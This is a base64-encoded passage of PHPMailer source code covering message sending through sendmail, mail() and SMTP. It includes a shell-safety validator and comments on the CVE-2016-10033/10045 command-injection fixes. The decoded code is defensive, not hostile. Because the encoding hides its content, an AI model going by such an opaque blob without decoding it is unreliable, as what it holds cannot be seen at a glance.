CAgICAgICR0aGlzLT5TdWJqZWN0ID0gdHJpbSgkdGhpcy0+U3ViamVjdCk7CiAgICAgICAgICAgIC8vIENyZWF0ZSBib2R5IGJlZm9yZSBoZWFkZXJzIGluIGNhc2UgYm9keSBtYWtlcyBjaGFuZ2VzIHRvIGhlYWRlcnMgKGUuZy4gYWx0ZXJpbmcgdHJhbnNmZXIgZW5jb2RpbmcpCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gJyc7CiAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keSA9ICR0aGlzLT5jcmVhdGVCb2R5KCk7CiAgICAgICAgICAgIC8vIGNyZWF0ZUJvZHkgbWF5IGhhdmUgYWRkZWQgc29tZSBoZWFkZXJzLCBzbyByZXRhaW4gdGhlbQogICAgICAgICAgICAkdGVtcGhlYWRlcnMgPSAkdGhpcy0+TUlNRUhlYWRlcjsKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAkdGhpcy0+Y3JlYXRlSGVhZGVyKCk7CiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICR0ZW1waGVhZGVyczsKICAgICAgICAgICAgLy8gVG8gY2FwdHVyZSB0aGUgY29tcGxldGUgbWVzc2FnZSB3aGVuIHVzaW5nIG1haWwoKSwgY3JlYXRlCiAgICAgICAgICAgIC8vIGFuIGV4dHJhIGhlYWRlciBsaXN0IHdoaWNoIGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbgogICAgICAgICAgICBpZiAoJ21haWwnID09ICR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgICAgICdTdWJqZWN0JywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyBTaWduIHdpdGggREtJTSBpZiBlbmFibGVkCiAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkRLSU1fZG9tYWluKQogICAgICAgICAgICAgICAgYW5kICFlbXB0eSgkdGhpcy0+REtJTV9zZWxlY3RvcikKICAgICAgICAgICAgICAgIGFuZCAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKQogICAgICAgICAgICAgICAgICAgIG9yICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgYW5kIHN0YXRpYzo6aXNQZXJtaXR0ZWRQYXRoKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBmaWxlX2V4aXN0cygkdGhpcy0+REtJTV9wcml2YXRlKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAkaGVhZGVyX2RraW0gPSAkdGhpcy0+REtJTV9BZGQoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUJvZHkKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9IHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyLCAiXHJcbiAiKSAuIHN0YXRpYzo6JExFIC4KICAgICAgICAgICAgICAgICAgICBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkaGVhZGVyX2RraW0pIC4gc3RhdGljOjokTEU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQogICAgLyoqCiAgICAgKiBBY3R1YWxseSBzZW5kIGEgbWVzc2FnZSB2aWEgdGhlIHNlbGVjdGVkIG1lY2hhbmlzbS4KICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcG9zdFNlbmQoKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIC8vIENob29zZSB0aGUgbWFpbGVyIGFuZCBzZW5kIHRocm91Z2ggaXQKICAgICAgICAgICAgc3dpdGNoICgkdGhpcy0+TWFpbGVyKSB7CiAgICAgICAgICAgICAgICBjYXNlICdzZW5kbWFpbCc6CiAgICAgICAgICAgICAgICBjYXNlICdxbWFpbCc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kbWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBjYXNlICdzbXRwJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHBTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgY2FzZSAnbWFpbCc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgJHNlbmRNZXRob2QgPSAkdGhpcy0+TWFpbGVyIC4gJ1NlbmQnOwogICAgICAgICAgICAgICAgICAgIGlmIChtZXRob2RfZXhpc3RzKCR0aGlzLCAkc2VuZE1ldGhvZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT4kc2VuZE1ldGhvZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB1c2luZyB0aGUgJFNlbmRtYWlsIHByb2dyYW0uCiAgICAgKgogICAgICogQHNlZSAgICBQSFBNYWlsZXI6OiRTZW5kbWFpbAogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5ICAgVGhlIG1lc3NhZ2UgYm9keQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kIHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgIGlmICgncW1haWwnID09ICR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtZiVzJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLWYlcyAtdCc7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoJ3FtYWlsJyA9PSAkdGhpcy0+TWFpbGVyKSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMnOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtdCc7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50Zigkc2VuZG1haWxGbXQsIGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCksICR0aGlzLT5TZW5kZXIpOwogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPlNpbmdsZVRvQXJyYXkgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgJG1haWwgPSBAcG9wZW4oJHNlbmRtYWlsLCAndycpOwogICAgICAgICAgICAgICAgaWYgKCEkbWFpbCkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBmd3JpdGUoJG1haWwsICdUbzogJyAuICR0b0FkZHIgLiAiXG4iKTsKICAgICAgICAgICAgICAgIGZ3cml0ZSgkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgICAgICBmd3JpdGUoJG1haWwsICRib2R5KTsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOwogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAgICAgKCRyZXN1bHQgPT0gMCksCiAgICAgICAgICAgICAgICAgICAgWyR0b0FkZHJdLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+YmNjLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5Gcm9tLAogICAgICAgICAgICAgICAgICAgIFtdCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgaWYgKDAgIT09ICRyZXN1bHQpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG1haWwgPSBAcG9wZW4oJHNlbmRtYWlsLCAndycpOwogICAgICAgICAgICBpZiAoISRtYWlsKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGZ3cml0ZSgkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgIGZ3cml0ZSgkbWFpbCwgJGJvZHkpOwogICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwKICAgICAgICAgICAgICAgICR0aGlzLT50bywKICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsCiAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgJHRoaXMtPkZyb20sCiAgICAgICAgICAgICAgICBbXQogICAgICAgICAgICApOwogICAgICAgICAgICBpZiAoMCAhPT0gJHJlc3VsdCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICAgIC8qKgogICAgICogRml4IENWRS0yMDE2LTEwMDMzIGFuZCBDVkUtMjAxNi0xMDA0NSBieSBkaXNhbGxvd2luZyBwb3RlbnRpYWxseSB1bnNhZmUgc2hlbGwgY2hhcmFjdGVycy4KICAgICAqIE5vdGUgdGhhdCBlc2NhcGVzaGVsbGFyZyBhbmQgZXNjYXBlc2hlbGxjbWQgYXJlIGluYWRlcXVhdGUgZm9yIG91ciBwdXJwb3NlcywgZXNwZWNpYWxseSBvbiBXaW5kb3dzLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvaXNzdWVzLzkyNCBDVkUtMjAxNi0xMDA0NSBidWcgcmVwb3J0CiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSBzdHJpbmcgdG8gYmUgdmFsaWRhdGVkCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gaXNTaGVsbFNhZmUoJHN0cmluZykKICAgIHsKICAgICAgICAvLyBGdXR1cmUtcHJvb2YKICAgICAgICBpZiAoZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcKICAgICAgICAgICAgb3IgIWluX2FycmF5KGVzY2FwZXNoZWxsYXJnKCRzdHJpbmcpLCBbIickc3RyaW5nJyIsICJcIiRzdHJpbmdcIiJdKQogICAgICAgICkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJHN0cmluZyk7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgKyskaSkgewogICAgICAgICAgICAkYyA9ICRzdHJpbmdbJGldOwogICAgICAgICAgICAvLyBBbGwgb3RoZXIgY2hhcmFjdGVycyBoYXZlIGEgc3BlY2lhbCBtZWFuaW5nIGluIGF0IGxlYXN0IG9uZSBjb21tb24gc2hlbGwsIGluY2x1ZGluZyA9IGFuZCArLgogICAgICAgICAgICAvLyBGdWxsIHN0b3AgKC4pIGhhcyBhIHNwZWNpYWwgbWVhbmluZyBpbiBjbWQuZXhlLCBidXQgaXRzIGltcGFjdCBzaG91bGQgYmUgbmVnbGlnaWJsZSBoZXJlLgogICAgICAgICAgICAvLyBOb3RlIHRoYXQgdGhpcyBkb2VzIHBlcm1pdCBub24tTGF0aW4gYWxwaGFudW1lcmljIGNoYXJhY3RlcnMgYmFzZWQgb24gdGhlIGN1cnJlbnQgbG9jYWxlLgogICAgICAgICAgICBpZiAoIWN0eXBlX2FsbnVtKCRjKSAmJiBzdHJwb3MoJ0BfLS4nLCAkYykgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICAvKioKICAgICAqIENoZWNrIHdoZXRoZXIgYSBmaWxlIHBhdGggaXMgb2YgYSBwZXJtaXR0ZWQgdHlwZS4KICAgICAqIFVzZWQgdG8gcmVqZWN0IFVSTHMgYW5kIHBoYXIgZmlsZXMgZnJvbSBmdW5jdGlvbnMgdGhhdCBhY2Nlc3MgbG9jYWwgZmlsZSBwYXRocywKICAgICAqIHN1Y2ggYXMgYWRkQXR0YWNobWVudC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgcmVsYXRpdmUgb3IgYWJzb2x1dGUgcGF0aCB0byBhIGZpbGUKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1Blcm1pdHRlZFBhdGgoJHBhdGgpCiAgICB7CiAgICAgICAgcmV0dXJuICFwcmVnX21hdGNoKCcjXlthLXpdKzovLyNpJywgJHBhdGgpOwogICAgfQogICAgLyoqCiAgICAgKiBTZW5kIG1haWwgdXNpbmcgdGhlIFBIUCBtYWlsKCkgZnVuY3Rpb24uCiAgICAgKgogICAgICogQHNlZSAgICBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Jvb2subWFpbC5waHAKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSAgIFRoZSBtZXNzYWdlIGJvZHkKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJHRvQXJyID0gW107CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsKICAgICAgICAgICAgJHRvQXJyW10gPSAkdGhpcy0+YWRkckZvcm1hdCgkdG9hZGRyKTsKICAgICAgICB9CiAgICAgICAgJHRvID0gaW1wbG9kZSgnLCAnLCAkdG9BcnIpOwogICAgICAgICRwYXJhbXMgPSBudWxsOwogICAgICAgIC8vVGhpcyBzZXRzIHRoZSBTTVRQIGVudmVsb3BlIHNlbmRlciB3aGljaCBnZXRzIHR1cm5lZCBpbnRvIGEgcmV0dXJuLXBhdGggaGVhZGVyIGJ5IHRoZSByZWNlaXZlcgogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kIHN0YXRpYzo6dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgIC8vQSBzcGFjZSBhZnRlciBgLWZgIGlzIG9wdGlvbmFsLCBidXQgdGhlcmUgaXMgYSBsb25nIGhpc3Rvcnkgb2YgaXRzIHByZXNlbmNlCiAgICAgICAgICAgIC8vY2F1c2luZyBwcm9ibGVtcywgc28gd2UgZG9uJ3QgdXNlIG9uZQogICAgICAgICAgICAvL0V4aW0gZG9jczogaHR0cDovL3d3dy5leGltLm9yZy9leGltLWh0bWwtY3VycmVudC9kb2MvaHRtbC9zcGVjX2h0bWwvY2gtdGhlX2V4aW1fY29tbWFuZF9saW5lLmh0bWwKICAgICAgICAgICAgLy9TZW5kbWFpbCBkb2NzOiBodHRwOi8vd3d3LnNlbmRtYWlsLm9yZy9+Y2EvZW1haWwvbWFuL3NlbmRtYWlsLmh0bWwKICAgICAgICAgICAgLy9RbWFpbCBkb2NzOiBodHRwOi8vd3d3LnFtYWlsLm9yZy9tYW4vbWFuOC9xbWFpbC1pbmplY3QuaHRtbAogICAgICAgICAgICAvL0V4YW1wbGUgcHJvYmxlbTogaHR0cHM6Ly93d3cuZHJ1cGFsLm9yZy9ub2RlLzEwNTc5NTQKICAgICAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgogICAgICAgICAgICBpZiAoc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgJG9sZF9mcm9tID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgPSBmYWxzZTsKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvIGFuZCBjb3VudCgkdG9BcnIpID4gMSkgewogICAgICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvQWRkciwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsIFskdG9BZGRyXSwgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tLCBbXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG8sICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsICR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tLCBbXSk7CiAgICAgICAgfQogICAgICAgIGlmIChpc3NldCgkb2xkX2Zyb20pKSB7CiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkb2xkX2Zyb20pOwogICAgICAgIH0KICAgICAgICBpZiAoISRyZXN1bHQpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnaW5zdGFudGlhdGUnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgLyoqCiAgICAgKiBHZXQgYW4gaW5zdGFuY2UgdG8gdXNlIGZvciBTTVRQIG9wZXJhdGlvbnMuCiAgICAgKiBPdmVycmlkZSB0aGlzIGZ1bmN0aW9uIHRvIGxvYWQgeW91ciBvd24gU01UUCBpbXBsZW1lbnRhdGlvbiwKICAgICAqIG9yIHNldCBvbmUgd2l0aCBzZXRTTVRQSW5zdGFuY2UuCiAgICAgKgogICAgICogQHJldHVybiBTTVRQCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTTVRQSW5zdGFuY2UoKQogICAgewogICAgICAgIGlmICghaXNfb2JqZWN0KCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9IG5ldyBTTVRQKCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+c210cDsKICAgIH0KICAgIC8qKgogICAgICogUHJvdmlkZSBhbiBpbnN0YW5jZSB0byB1c2UgZm9yIFNNVFAgb3BlcmF0aW9ucy4KICAgICAqCiAgICAgKiBAcGFyYW0gU01UUCAkc210cAogICAgICoKICAgICAqIEByZXR1cm4gU01UUAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0U01UUEluc3RhbmNlKFNNVFAgJHNtdHApCiAgICB7CiAgICAgICAgJHRoaXMtPnNtdHAgPSAkc210cDsKICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHA7CiAgICB9CiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB2aWEgU01UUC4KICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlcmUgaXMgYSBiYWQgTUFJTCBGUk9NLCBSQ1BULCBvciBEQVRBIGlucHV0LgogICAgICoKICAgICAqIEBzZWUgUEhQTWFpbGVyOjpzZXRTTVRQSW5zdGFuY2UoKSB0byB1c2UgYSBkaWZmZXJlbnQgY2xhc3MuCiAgICAgKgogICAgICogQHVzZXMgXFBIUE1haWxlclxQSFBNYWlsZXJcU01UUAogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5ICAgVGhlIG1lc3NhZ2UgYm9keQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzbXRwU2VuZCgkaGVhZGVyLCAkYm9keSkKICAgIHsKICAgICAgICAkYmFkX3JjcHQgPSBbXTsKICAgICAgICBpZiAoISR0aGlzLT5zbXRwQ29ubmVjdCgkdGhpcy0+U01UUE9wdGlvbnMpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NtdHBfY29ubmVjdF9mYWlsZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIC8vU2VuZGVyIGFscmVhZHkgdmFsaWRhdGVkIGluIHByZVNlbmQoKQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+U2VuZGVyKSB7CiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+bWFpbCgkc210cF9mcm9tKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+RXJyb3JJbmZvLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgJGNhbGxiYWNrcyA9IFtdOwogICAgICAgIC8vIEF0dGVtcHQgdG8gc2VuZCB0byBhbGwgcmVjaXBpZW50cwogICAgICAgIGZvcmVhY2ggKFskdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjY10gYXMgJHRvZ3JvdXApIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRvZ3JvdXAgYXMgJHRvKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdLCAkdGhpcy0+ZHNuKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgICAgICAgICAgICAgICRiYWRfcmNwdFtdID0gWyd0bycgPT4gJHRvWzBdLCAnZXJyb3InID0+ICRlcnJvclsnZGV0YWlsJ11dOwogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkY2FsbGJhY2tzW10gPSBbJ2lzc2VudCc9PiRpc1NlbnQsICd0byc9PiR0b1swXV07CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy8gT25seSBzZW5kIHRoZSBEQVRBIGNvbW1hbmQgaWYgd2UgaGF2ZSB2aWFibGUgcmVjaXBpZW50cwogICAgICAgIGlmICgoY291bnQoJHRoaXMtPmF